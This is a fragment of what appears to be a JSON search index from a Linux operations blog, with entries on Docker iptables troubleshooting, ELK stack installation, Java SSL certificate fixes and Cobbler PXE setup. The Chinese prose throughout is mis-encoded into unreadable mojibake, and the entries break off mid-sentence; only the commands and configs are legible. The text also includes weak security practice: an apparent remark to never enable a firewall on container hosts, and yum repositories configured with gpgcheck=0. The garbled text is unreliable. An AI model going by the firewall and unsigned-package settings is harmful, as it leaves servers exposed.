dockerå®¹å™¨ç½‘ç»œé€šä¿¡ä½¿ç”¨çš„ï¼Œä¸€èˆ¬æ¥è¯´é‡ç½®é˜²ç«å¢™ä¼šåˆ é™¤æ‰€æœ‰çš„è‡ªå®šä¹‰è§„åˆ™é“¾ï¼Œæ‰€ä»¥é‡ç½®åï¼Œiptableså°±ä¸ä¼šåœ¨åŒ…å«dockeråˆ›å»ºçš„é‚£äº›è§„åˆ™é“¾äº†ã€‚æ­¤æ—¶ï¼Œåªè¦ä¸»åŠ¨é‡å¯dockeræœåŠ¡å°±å¯ä»¥äº†ã€‚ä½†æ˜¯è¿™æ ·å¯èƒ½å°±ä¼šäº§ç”Ÿå¦ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯DOCKER-USERè§„åˆ™é“¾ä¸¢å¤±ï¼Œè¿™ä¸ªæ—¶å€™åªéœ€è¦ä¸»åŠ¨åˆ›å»ºä¸€ä¸ªç½‘æ¡¥ï¼Œç„¶ååˆ é™¤å°±å¯ä»¥äº†(æ­¤é—®é¢˜å¤„ç†å¯èƒ½ä¼šå¯¼è‡´å®¹å™¨å†…ç½‘ç»œæ— æ³•æ­£å¸¸è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œè§ä¸‹ä¸€ä¸ªé—®é¢˜)ã€‚ç„¶åæµ‹è¯•ä¸‹å®¹å™¨å†…è®¿é—®å¤–éƒ¨ç½‘ç»œæ˜¯å¦æ­£å¸¸, æ¯”å¦‚å®¹å™¨å†…éœ€è¦è¿æ¥è¿œç¨‹æ•°æ®åº“ã€‚ $\u003e docker network create net-host $\u003e docker network rm net-host docker å®¹å™¨å†…æ— æ³•è®¿é—®è¿œç¨‹æœåŠ¡å™¨ç½‘ç»œ å½“å‰è®°å½•é—®é¢˜äº§ç”ŸåŸå› å¯èƒ½æ˜¯ç”±äºä¸Šè¿°çš„DOCKER-USERè§„åˆ™é“¾ä¸¢å¤±å¤„ç†åè€Œäº§ç”Ÿçš„æ–°çš„é—®é¢˜ï¼Œéƒ¨ç½²ä¸ºdocker-composeï¼Œè§£å†³å…ˆæ˜¯downå®¹å™¨ï¼Œç„¶åé‡å¯dockerï¼Œå†é‡æ–°upå®¹å™¨ã€‚åæµ‹è¯•å®¹å™¨å†…ç½‘ç»œè®¿é—®æ­£å¸¸ã€‚ docker ç½‘ç»œæ¡¥è”ç½‘ç»œæ— æ³•è®¿é—®ç‰©ç†æœºç½‘ç»œé—®é¢˜ å½“å®¹å™¨ä»¥æ¡¥è¿æ¨¡å¼å¯åŠ¨æ—¶æ˜¯æ— æ³•è®¿é—®ç‰©ç†ä¸»æœºç½‘ç»œçš„,æ­¤æ—¶éœ€è¦æ‰‹åŠ¨é…ç½®ä¸‹é˜²ç«å¢™ä¿¡ä»»å®¹å™¨çš„æ¡¥è¿ç½‘å¡æµé‡ # å¦‚å®¹å™¨å¯åŠ¨åçš„ç½‘å¡ä¸º br-3630aa8a433b ,åˆ™é˜²ç«å¢™æ·»åŠ ä¸‹ $\u003e iptables -A INPUT -i br-3630aa8a433b -j ACCEPT ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","docker","è§£å†³æ–¹æ¡ˆ"],"title":"Dockerè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Elkæ—¥å¿—åˆ†æç³»ç»Ÿ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/","tags":["linux","elk","æ—¥å¿—"],"title":"Elkæ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"elkæ—¥å¿—æ”¶é›†ç³»ç»Ÿï¼Œelasticsearch(å­˜å‚¨+æœç´¢)+logstash(æ”¶é›†)+kibana(å±•ç¤º)ç»¼åˆæŠ€æœ¯,ç®€ç§°elk æ­å»ºç¯å¢ƒ: virtualbox5.1.26 centos 6.7 openjdk1.8 elasticsearch 2.x elasticsearch éƒ¨ç½²éœ€è¦å®‰è£…jdk,openjdkå’Œoraclejdkéƒ½å¯ä»¥,ç”±äºç³»ç»Ÿå½“ä¸­åŸæ¥å·²ç»æœ‰openjdkäº†,æˆ‘è¿™å„¿å°±åªæŠŠjdkå‡çº§äº†ä¸‹ [root@11 ~]# yum install java-1.8.0-openjdk -y [root@11 ~]# java -version openjdk version \"1.8.0_141\" OpenJDK Runtime Environment (build 1.8.0_141-b16) OpenJDK 64-Bit Server VM (build 25.141-b16, mixed mode) Elasticsearch å®‰è£…æ–¹å¼ï¼š ä¸‹è½½å¹¶å®‰è£…GPG keyï¼Œæ·»åŠ elasticsearchæº [root@11 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@11 ~]# vim /etc/yum.repos.d/elasticsearch.repo [elasticsearch-2.x] name=Elasticsearch repository for 2.x packages baseurl=http://packages.elastic.co/elasticsearch/2.x/centos gpgcheck=1 gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch enabled=1 å®‰è£…ï¼Œå¹¶ä¿®æ”¹é…ç½®ä¿¡æ¯ [root@11 ~]# yum install -y elasticsearch #-------è¿‡ç¨‹çœç•¥----------- [root@11 ~]# vim /etc/elasticsearch/elasticsearch.yml cluster.name: my-11 #é›†ç¾¤æ ‡è¯†ç¬¦ node.name: 67-11 #èŠ‚ç‚¹åç§°ï¼ˆé›†ç¾¤æœºå™¨éœ€è¦ä¿®æ”¹æ­¤èŠ‚ç‚¹åç§°ï¼‰ path.data: /data/es-data #æ•°æ®å­˜å‚¨çš„ç›®å½•ï¼Œè¿™ä¸ªç›®å½•çš„æƒé™æ‰€å±çš„ç”¨æˆ·å’Œç»„ä¸ºelasticsearch(å¤šä¸ªé€—å·éš”å¼€) path.logs: /var/log/elasticsearch #æ—¥å¿—æ–‡ä»¶ä½ç½® bootstrap.memory_lock: true #ä¿è¯æ•°æ®ä¸ä¼šå†™å…¥äº¤æ¢åˆ†åŒºï¼Œç”Ÿäº§ç¯å¢ƒå»ºè®®æ‰“å¼€ï¼Œä¿è¯æ€§èƒ½(å¯èƒ½ä¼šå¯¼è‡´å¯åŠ¨å¤±è´¥ï¼Œå¤±è´¥æ—¶å…³é—­) network.host: 172.16.67.11 #æ­¤å‚æ•°é…ç½®çš„å°±æ˜¯è‡ªå·±çš„ipï¼Œå¤šä¸ªipå»ºè®®é…ç½®ï¼Œé»˜è®¤0.0.0.0ï¼ˆé›†ç¾¤æœºå™¨éœ€è¦ä¿®æ”¹æ­¤èŠ‚ç‚¹åç§°ï¼‰ http.port: 9200 #é»˜è®¤ç«¯å£ #discovery.zen.ping.unicast.hosts: [\"172.16.67.11\", \"172.16.67.12\"] #é›†ç¾¤é…ç½®é¡¹ï¼Œelasticsearchåˆ†ä¸ºç»„æ’­å’Œå•æ’­ä¸¤ç§æ¨¡å¼ã€‚ç»„æ’­æ‰€æœ‰é›†ç¾¤æœºå™¨çš„éƒ½åœ¨åŒä¸€ä¸ªç»„é‡Œé¢ï¼Œå•æ’­ #è¡¨ç¤ºè®©æˆ‘ä»¬ä¸ªå‘Šè¯‰å…¶ä»–äººï¼Œé™¤äº†è¿™å°æœºå™¨è¿˜æœ‰é‚£äº›æœºå™¨ï¼Œä¸€èˆ¬é»˜è®¤å°±å¯ä»¥äº†ï¼ˆè¿™ä¸ªåœ°æ–¹ç”¨virtualboxçš„natç½‘ç»œæ¨¡å¼ä½œæµ‹è¯•çš„æ—¶å€™ï¼Œé»˜è®¤çš„ç»„æ’­æ¨¡å¼æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œéœ€è¦é…ç½®ä¸ºå•æ’­ #æ¨¡å¼ï¼‰ï¼Œè¿™å„¿å¯èƒ½å¯¹äºè¿™ä¸ªç»„æ’­å’Œå•æ’­æè¿°çš„ä¸æ˜¯å¾ˆå¯¹ï¼Œè¦æƒ³è¯¦ç»†äº†è§£çš„ï¼Œè‡ªå·±å»æŸ¥è¯¢ç›¸å…³èµ„æ–™å§ã€‚è¿˜æœ‰è¿™ä¸ªåªéœ€è¦æœ‰ä¸€å°æœºå™¨é…ç½®å°±å¯ä»¥äº†ã€‚ å¯åŠ¨elasticsearch [root@11 ~]# service elasticsearch start #yumå®‰è£…çš„ï¼Œå¦‚æœè¿™å„¿å¯åŠ¨å¦‚æœå‡ºç°äº†ä»€ä¹ˆé—®é¢˜ï¼Œä¸€èˆ¬å°±æ˜¯å› ä¸ºé˜²ç«å¢™æˆ–è€…å¯¹åº”ç›®å½•çš„æƒé™ï¼Œ [root@11 ~]# netstat -lntp|grep java #elasticsearch ä¸»è¦ä½¿ç”¨çš„å°±æ˜¯è¿™ä¸¤ä¸ªç«¯å£ tcp 0 0 ::ffff:172.16.67.11:9200 :::* LISTEN 30464/java tcp 0 0 ::ffff:172.16.67.11:9300 :::* LISTEN 30464/java ä½¿ç”¨æ–¹å¼: elasticsearch ä½¿ç”¨éƒ½æ˜¯ä¾èµ–æ’ä»¶ï¼Œæ¯”è¾ƒå¥½ç”¨çš„æœ‰headã€kopf [root@11 ~]# /usr/share/elasticsearch/bin/plugin install mobz/elasticsearch-head #ä¸»è¦æ˜¯elasticsearché›†ç¾¤ç®¡ç†çš„æ’ä»¶ [root@11 ~]# /usr/share/elasticsearch/bin/plugin install lmenezes/elasticsearch-kopf #ç›¸å¯¹äºheadåŠŸèƒ½æ›´å…¨çš„ä¸€ä¸ªç®¡ç†æ’ä»¶ æ’ä»¶å®‰è£…åï¼Œå­˜å…¥ç›®å½•æ˜¯åœ¨elasticsearchçš„æ’ä»¶ç›®å½• [root@11 ~]# ls -l /usr/share/elasticsearch/plugins/ æ€»ç”¨é‡ 8 drwxr-xr-x. 6 root root 4096 8æœˆ 17 03:09 head drwxr-xr-x. 8 root root 4096 8æœˆ 17 03:12 kopf æµè§ˆå™¨è®¿é—®ï¼šhttp://172.16.67.11:9200/_pulgin/head,http://172.16.67.11:9200/_pulgin/kopf ä¿¡æ¯: æ·»åŠ æ–¹å¼ï¼šç‚¹å‡»â€˜å¤åˆæŸ¥è¯¢â€™-â€˜æŸ¥è¯¢â€™ï¼Œ ç¬¬ä¸€æ ï¼Œå®é™…å°±æ˜¯ä½ çš„ip+ç«¯å£ï¼Œè¿™ä¸ªæ˜¯é»˜è®¤å¡«å†™å¥½äº†çš„ã€‚ ç¬¬äºŒæ ï¼Œé€‰æ‹©post,å†…å®¹/index-demo/test ç¬¬ä¸‰æ ï¼Œå®é™…å°±æ˜¯ä¸€ä¸ªjsonä¸²ï¼Œéšä¾¿å½•å…¥åæäº¤å°±å¯ä»¥äº†ï¼Œç„¶åæäº¤å°±å¯ä»¥äº†ã€‚ æ·»åŠ è¿‡ååœ¨é‡æ–°åˆ·æ–°ä¸Šè¿°é¡µé¢,å°±å¯ä»¥çœ‹åˆ°æ•°æ®äº†,ä¸Šå›¾ä¸­çš„åœˆä¸­,ç¬¬ä¸€ä¸ªä»£è¡¨çš„é›†ç¾¤å¥åº·å€¼,ç»¿è‰²ä»£è¡¨å¥åº·,é»„è‰²ä»£è¡¨è­¦å‘Š-æ²¡æœ‰ä¸»åˆ†ç‰‡ä¸¢å¤±,çº¢è‰²ä»£è¡¨å­˜åœ¨æ•°æ®ä¸¢å¤±, ç¬¬äºŒä¸ª ç»¿è‰²ä»£è¡¨åˆ†ç‰‡,ç²—çº¿ä»£è¡¨ä¸»åˆ†ç‰‡,è¥¿çº¿ä»£è¡¨å‰¯æœ¬åˆ†ç‰‡. é›†ç¾¤ : é›†ç¾¤çš„è¯,é…ç½®å°±åªéœ€è¦æ”¹åŠ¨ä¸‹é…ç½®æ–‡ä»¶çš„èŠ‚ç‚¹åç§°,å¦‚æœä½ æ˜¯ä½¿ç”¨è™šæ‹Ÿæœºæ¨¡æ‹Ÿnatç½‘ç»œæ¨¡å¼çš„ä¸»æœº,å¯èƒ½éœ€è¦å°†ä¸»æœºæ¨¡å¼æ›´æ”¹ä¸ºå•æ³¢æ¨¡å¼,è¿™ä¸ªå‰é¢æœ‰è¯´æ˜. LogStash å®‰è£…æ–¹å¼: ä¸‹è½½å¹¶å®‰è£…GPG keyã€æ·»åŠ yumä»“åº“ [root@11 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@11 ~]# vim /etc/yum.repos.d/logstash.repo [logstash-2.3] name=Logstash repository for 2.3.x packages baseurl=https://packages.elastic.co/logstash/2.3/centos gpgcheck=1 gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch enabled=1 å®‰è£…åŠæµ‹è¯• [root@11 ~]# yum install -y logstash #----------è¿‡ç¨‹çœç•¥----------- #----------æµ‹è¯•æ¨¡å—start----------- [root@11 ~]# /opt/logstash/bin/logstash -e \"input { stdin{} } output { stdout{codec =\u003e rubydebug} }\" # =\u003e è¿™å„¿è¡¨ç¤ºçš„æ˜¯ç­‰å·ï¼›stdout {} æ ¼å¼åŒ–è¾“å‡ºåˆ°å‰å° Settings: Default pipeline workers: 4 Pipeline main started hello logstash #è¾“å…¥å†…å®¹ { \"message\" =\u003e \"hello logstash\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e \"2017-08-17T17:06:19.892Z\", \"host\" =\u003e \"11\" } [root@11 ~]# /opt/logstash/bin/logstash -e 'input { stdin{} } output { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"logstash-%{+YYYY.MM.dd}\" } }' Settings: Default pipeline workers: 4 Pipeline main started haha # è¯»å–å¹¶å†™å…¥elasticsearchä¸­,æŒ‰ç…§æ—¥æœŸå…´å»ºç´¢å¼•,æ³¨æ„æ­¤å¤„æ˜¯ä¸ä¼šæ‰“å°çš„ 123 # è‹¥è¦æ—¢æ‰“å°ä¹Ÿè¾“å‡º,éœ€è¦å¢åŠ å…¶ä»–æ’ä»¶ä»£ç .å¦‚:output { stdout {} elasticsearch asdf # { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"logstash-%{+YYYY.MM.dd}\" } } eeeeeeeee # # è®¿é—® http://172.16.67.11:9200/_plugin/head åœ°å€ä¸‹çš„'æ•°æ®æµè§ˆ'æŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸ #----------æµ‹è¯•æ¨¡å—end----------- é…ç½®æ–¹å¼ æ³¨æ„/etc/logstash/conf.d å¦‚æœæœªæŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œlogstashé»˜è®¤ä¼šåŠ è½½æ‰€æœ‰çš„é…ç½®æ–‡","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","elk","æ—¥å¿—"],"title":"Elkæ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Javaè¿ç»´æ•…éšœè®°å½•","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","java","è§£å†³æ–¹æ¡ˆ"],"title":"Javaè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; æ¥å…¥å¤§ç¥çš„è¯´æ˜:â€‚https://www.jianshu.com/p/a12906b5d0f0 é—®é¢˜ï¼š åŸæœ‰ä¸€ä¸ªè·‘äº†å¾ˆä¹…çš„javaé¡¹ç›®åœ¨è¿è¡Œçš„æ—¶å€™æŠ¥äº†ä¸Šè¿°ä¸€ä¸ªé”™è¯¯ï¼ŒååŠ©å¼€å‘åˆ†æåå‘ç°æ˜¯ä¸€ä¸ªhttpsçš„é—®é¢˜ï¼Œæ£€æŸ¥äº†è°ƒç”¨çš„æ¥å£åœ°å€ï¼Œå‘ç°è¯¥æ¥å£åœ°å€çš„è¯ä¹¦å·²ç»å˜æˆäº†Let's Encryptçš„è¯ä¹¦,å¤šæ–¹æŸ¥è¯åå‘ç°Let's Encryptè¯ä¹¦å¤ªæ–°ï¼Œä½¿ç”¨çš„javaç‰ˆæœ¬å¤ªæ—§è€Œå¹¶æœªåŠ å…¥æ ¹è¯ä¹¦å¯¼è‡´ã€‚è§£å†³æ–¹æ¡ˆæ˜¯ï¼Œè¦ä¹ˆå‡çº§javaç‰ˆæœ¬ï¼Œè¦ä¹ˆå¯¼å…¥æ ¹è¯ä¹¦åˆ°jdkä¿¡ä»»å½“ä¸­å»ã€‚ æœ¬æ¬¡è®°å½•åŠ å…¥ä¿¡ä»»æ–¹å¼ : (å¼‚å¸¸)æµ‹è¯• $ git clone https://github.com/dimalinux/SSLPing.git $ java -jar SSLPing/dist/SSLPing.jar helloworld.letsencrypt.org 443 # æµ‹è¯•ç»“æœå¦‚ä¸‹ : # javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target è§£å†³ $ wget https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem $ keytool -trustcacerts -keystore \"$JAVA_HOME/jre/lib/security/cacerts\" -storepass changeit -noprompt -importcert -alias lets-encrypt-x3-cross-signed -file \"lets-encrypt-x3-cross-signed.pem\" # å¯¼å…¥ç»“æœ: # Certificate was added to keystore (æˆåŠŸ)æµ‹è¯• $ java -jar SSLPing.jar visa.vippay.org 443 Successfully connected 2. nginx åå‘ä»£ç† Springboot å®¹å™¨åº”ç”¨ï¼Œæµè§ˆå™¨è®¿é—®æ—¶é™æ€èµ„æºé—´æ¥æ€§502 ç¬¬ä¸€ç§æƒ…å†µ: cookieæºå¸¦çš„headeræ³°æ–—ï¼Œè¯·æ±‚å¤´æ•°æ®è¿‡å¤§ # nginx è°ƒæ•´ä¸€ä¸‹å‚æ•° proxy_buffer_size 64k; proxy_buffers 32 32k; proxy_busy_buffers_size 128k; ç¬¬äºŒç§æƒ…å†µ: é˜²ç«å¢™é—®é¢˜ï¼Œé‡ç½®å°±å¥½äº†(æœ‰å®¹å™¨çš„æœåŠ¡å™¨ä¸€å®šä¸è¦å¼€é˜²ç«å¢™,ä¸ç„¶å„ç§é—®é¢˜) 2. cn.hutool.core.io.IORuntimeException: SSLHandshakeException: Received fatal alert: unrecognized_name é—®é¢˜ï¼š å¼€å‘çš„ä¸€ä¸ªjavaç¨‹åºï¼Œè¿æ¥æµ‹è¯•ç¯å¢ƒçš„apiæ­£å¸¸ï¼Œä½†åˆ‡æ¢åˆ°æ­£å¼çš„apiå°±æŠ¥é”™ åˆ†æï¼šå¯èƒ½ï¼Œæ­£å¼ç¯å¢ƒhttps ä»…æ”¯æŒ tls1.2, æˆ‘ä»¬ä½¿ç”¨çš„JDKå¯èƒ½ä¸æ”¯æŒ è§£å†³: å‡çº§JDK 8u111 åˆ° JDK 8u322ï¼Œå°±å¯ä»¥äº†(å®é™…ç¯å¢ƒ, åŸºç¡€å®¹å™¨ java:8u111 åˆ‡æ¢åˆ°openjdk:8u322) ","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","java","è§£å†³æ–¹æ¡ˆ"],"title":"Javaè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"Cobbleræ— äººå€¼å®ˆå®‰è£…","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/","tags":["linux","cobbler","è§£å†³æ–¹æ¡ˆ"],"title":"Cobbleræ— äººå€¼å®ˆå®‰è£…","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" æ–‡ç« æ¥æº https://www.linuxprobe.com/cobbler-installation-server.html 1. Cobbler è¿è¡Œæµç¨‹ Server ç«¯ï¼š ç¬¬ä¸€æ­¥ï¼šå¯åŠ¨ Cobbler æœåŠ¡ ç¬¬äºŒæ­¥ï¼šè¿›è¡Œ Cobbler é”™è¯¯æ£€æŸ¥ï¼Œæ‰§è¡Œ Cobbler check å‘½ä»¤ ç¬¬ä¸‰æ­¥ï¼šè¿›è¡Œé…ç½®åŒæ­¥ï¼Œæ‰§è¡Œ Cobbler sync å‘½ä»¤ ç¬¬å››æ­¥ï¼šå¤åˆ¶ç›¸å…³å¯åŠ¨æ–‡ä»¶æ–‡ä»¶åˆ° TFTP ç›®å½•ä¸­ ç¬¬äº”æ­¥ï¼šå¯åŠ¨ DHCP æœåŠ¡ï¼Œæä¾›åœ°å€åˆ†é… ç¬¬å…­æ­¥ï¼šDHCP æœåŠ¡åˆ†é… IP åœ°å€ ç¬¬ä¸ƒæ­¥ï¼šTFTP ä¼ è¾“å¯åŠ¨æ–‡ä»¶ ç¬¬å…«æ­¥ï¼šServer ç«¯æ¥æ”¶å®‰è£…ä¿¡æ¯ ç¬¬ä¹æ­¥ï¼šServer ç«¯å‘é€ ISO é•œåƒä¸ Kickstart æ–‡ä»¶ Client ç«¯ï¼š ç¬¬ä¸€æ­¥ï¼šå®¢æˆ·ç«¯ä»¥ PXE æ¨¡å¼å¯åŠ¨ ç¬¬äºŒæ­¥ï¼šå®¢æˆ·ç«¯è·å– IP åœ°å€ ç¬¬ä¸‰æ­¥ï¼šé€šè¿‡ TFTP æœåŠ¡å™¨è·å–å¯åŠ¨æ–‡ä»¶ ç¬¬å››æ­¥ï¼šè¿›å…¥ Cobbler å®‰è£…é€‰æ‹©ç•Œé¢ ç¬¬äº”æ­¥ï¼šå®¢æˆ·ç«¯ç¡®å®šåŠ è½½ä¿¡æ¯ ç¬¬å…­æ­¥ï¼šæ ¹æ®é…ç½®ä¿¡æ¯å‡†å¤‡å®‰è£…ç³»ç»Ÿ ç¬¬ä¸ƒæ­¥ï¼šåŠ è½½ Kickstart æ–‡ä»¶ ç¬¬å…«æ­¥ï¼šä¼ è¾“ç³»ç»Ÿå®‰è£…çš„å…¶å®ƒæ–‡ä»¶ ç¬¬ä¹æ­¥ï¼šè¿›è¡Œå®‰è£…ç³»ç»Ÿ 2. æ­å»º Cobbler æ— äººå€¼å®ˆå®‰è£…æœåŠ¡å™¨ 2.1. å®‰è£…é…ç½® Cobbler 2.1.1. é¦–å…ˆå®‰è£… epel-releaseï¼ŒCobbler å’Œ tftp-server åœ¨ base æºä¸­æ˜¯æ²¡æœ‰çš„ $\u003e yum install -y epel-release 2.1.2. å®‰è£… Cobbler å…¶å®æœ‰ä¸€éƒ¨åˆ†è½¯ä»¶ä¼šè¢«å½“åšä¾èµ–è¿›è¡Œå®‰è£…ä¸Šå»ï¼Œæ¯”å¦‚ tftp å’Œ httpd æœåŠ¡ï¼Œæˆ‘ä»¬è¿™é‡Œä¸ºäº†æ–¹ä¾¿å¯ä»¥ä¸€å¹¶å®‰è£…ï¼Œé¿å…åç»­å‡ºç°ç›¸å…³é—®é¢˜ã€‚ $\u003e yum install -y cobbler cobbler-web dhcp tftp-server pykickstart httpd rsync xinetd æ³¨æ„: å¿…é¡»æŠŠyumæºé…å¥½ï¼Œå¦åˆ™æ— æ³•å…¨éƒ¨å®‰è£…ä»¥ä¸Šè½¯ä»¶ï¼ $\u003e vim /etc/yum.repos.d/CentOS-Base.repo #åœ¨CentOS-Base.repoé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹æº [aliyun-os] name=aliyun-os baseurl=https://mirrors.aliyun.com/centos/7/os/x86_64/ enabled=1 gpgcheck=0 [aliyun-epel] name=aliyun-epel baseurl=https://mirrors.aliyun.com/epel/7/x86_64/ enabled=1 gpgcheck=0 [aliyun-extra] name=aliyun-extra baseurl=https://mirrors.aliyun.com/centos/7/extras/x86_64/ enabled=1 gpgcheck=0 2.1.3. è½¯ä»¶ä½œç”¨è¯´æ˜ cobbler #Cobbler ç¨‹åºåŒ… cobbler-web #Cobbler çš„ Web æœåŠ¡åŒ… pykickstart #Cobbler æ£€æŸ¥ kickstart è¯­æ³•é”™è¯¯ httpd #Apache Web æœåŠ¡ 2.1.4. Cobbler å·¥ä½œç›®å½•ä»‹ç» $\u003e ls /etc/cobbler/ auth.conf genders.template named.template secondary.template zone.template cheetah_macros import_rsync_whitelist power settings zone_templates cobbler_bash iso pxe tftpd.template completions ldap reporting users.conf dhcp.template modules.conf rsync.exclude users.digest dnsmasq.template mongodb.conf rsync.template version /etc/cobbler # é…ç½®æ–‡ä»¶ç›®å½• /etc/cobbler/settings # Cobbler ä¸»é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ YAML æ ºå¼ï¼ŒCobbler æ˜¯ python å†™çš„ç¨‹åºã€‚ /etc/cobbler/dhcp.template # DHCPæœåŠ¡çš„é…ç½®æ¨¡æ¿ /etc/cobbler/tftpd.template # tftp æœåŠ¡çš„é…ç½®æ¨¡æ¿ /etc/cobbler/rsync.template # rsync æœåŠ¡çš„é…ç½®æ¨¡æ¿ /etc/Cobbler/iso # iso æ¨¡æ¿é…ç½®æ–‡ä»¶ç›®å½• /etc/cobbler/pxe # pxe æ¨¡æ¿æ–‡ä»¶ç›®å½• /etc/cobbler/power # ç”µæºçš„é…ç½®æ–‡ä»¶ç›®å½• /etc/cobbler/users.conf # Web æœåŠ¡æˆæƒé…ç½®æ–‡ä»¶ /etc/cobbler/users.digest # ç”¨äº Web è®¿é—®çš„ç”¨æˆ·åå¯†ç é…ç½®æ–‡ä»¶ /etc/cobbler/dnsmasq.template # DNS æœåŠ¡çš„é…ç½®æ¨¡æ¿ /etc/cobbler/modules.conf # Cobbler æ¨¡å—é…ç½®æ–‡ä»¶ /var/lib/cobbler # Cobbler æ•°æ®ç›®å½• /var/lib/cobbler/config # é…ç½®æ–‡ä»¶ /var/lib/cobbler/kickstarts # é»˜è®¤å­˜æ”¾ kickstart æ–‡ä»¶ /var/lib/cobbler/loaders # å­˜æ”¾çš„å„ç§å¼•å¯¼ç¨‹åº /var/www/cobbler # ç³»ç»Ÿå®‰è£…é•œåƒç›®å½• /var/www/cobbler/ks_mirror # å¯¼å…¥çš„ç³»ç»Ÿé•œåƒåˆ—è¡¨ /var/www/cobbler/images # å¯¼å…¥çš„ç³»ç»Ÿé•œåƒå¯åŠ¨æ–‡ä»¶ /var/www/cobbler/repo_mirror # yum æºå­˜å‚¨ç›®å½• /var/log/cobbler # æ—¥å¿—ç›®å½• /var/log/cobbler/install.log # å®¢æˆ·ç«¯ç³»ç»Ÿå®‰è£…æ—¥å¿— /var/log/cobbler/cobbler.log # Cobbler æ—¥å¿— 2.1.5. é¦–å…ˆå¯åŠ¨ Cobbler å’Œ httpd æœåŠ¡ $\u003e systemctl start cobblerd httpd 2.1.6. æ£€æŸ¥é…ç½® $\u003e cobbler check The following are potential configuration items that you may want to fix: 1 : The 'server' field in /etc/cobbler/settings must be set to something other than localhost, or kickstarting features will not work. This should be a resolvable hostname or IP for the boot server as reachable by all machines that will use it. 2 : For PXE to be functional, the 'next_server' field in /etc/cobbler/settings must be set to something other than 127.0.0.1, and should match the IP of the boot server on the PXE network. 3 : change 'disable' to 'no' in /etc/xinetd.d/tftp 4 : Some network boot-loaders are missing from /var/lib/cobbler/loaders, you may run 'cobbler get-loaders' to download them, or, if you only want to handle x86/x86_64 netbooting, you may ensure that you have installed a *recent* version of the syslinux package installed and can ignore this message entirely. Files in this directory, should you want to support all architectures, should include pxelinux.0, menu.c32, elilo.efi, and yaboot. The 'cobbler get-loaders' command is the easiest way to resolve these requirements. 5 : enable and start rsyncd.service with systemctl 6 : debmirror package is not installed, it will be required to manage debian deployments and repositories 7 : The default password used by the sample templates for newly installed ma","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:0:0","tags":["linux","cobbler","è§£å†³æ–¹æ¡ˆ"],"title":"Cobbleræ— 